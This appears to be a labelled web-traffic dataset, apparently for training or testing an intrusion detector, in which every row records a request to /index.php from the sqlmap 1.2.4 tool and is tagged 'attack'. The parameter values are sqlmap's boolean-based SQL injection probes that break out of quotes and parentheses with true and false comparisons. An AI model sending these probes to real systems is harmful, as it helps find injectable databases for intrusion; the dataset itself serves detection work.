/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",4618,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs'"")((...((",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs'kwpese<'"">agntmh",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs') and 7648=3259-- fuiv,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs') and 3283=3283-- incm,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' and 6051=6196-- zcrl,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' and 3283=3283-- nyiy,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs') and 8539=6961 and ('bmrj'='bmrj,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs') and 3283=3283 and ('duvg'='duvg,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs')) and 6015=1432 and (('ggmx'='ggmx,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs')) and 3283=3283 and (('ldln'='ldln,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs'))) and 5481=6048 and ((('cjyx'='cjyx,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs'))) and 3283=3283 and ((('ccae'='ccae,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' and 7113=7444 and 'yecf'='yecf,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' and 3283=3283 and 'cbss'='cbss,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs') and 9868=6758 and ('xeya' like 'xeya,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs') and 3283=3283 and ('nuhs' like 'nuhs,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs')) and 1741=9015 and (('qljj' like 'qljj,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs')) and 3283=3283 and (('osgp' like 'osgp,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs'))) and 7309=2657 and ((('gkcn' like 'gkcn,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs'))) and 3283=3283 and ((('grpd' like 'grpd,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' and 4934=5856 and 'gdoi' like 'gdoi,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' and 3283=3283 and 'wvct' like 'wvct,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"") and 2991=5688 and (""ozoh""=""ozoh",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"") and 3283=3283 and (""ytno""=""ytno",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"")) and 7249=9972 and ((""sbuw""=""sbuw",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"")) and 3283=3283 and ((""qsqr""=""qsqr",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs""))) and 7246=4486 and (((""nkri""=""nkri",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs""))) and 3283=3283 and (((""bvzr""=""bvzr",attack
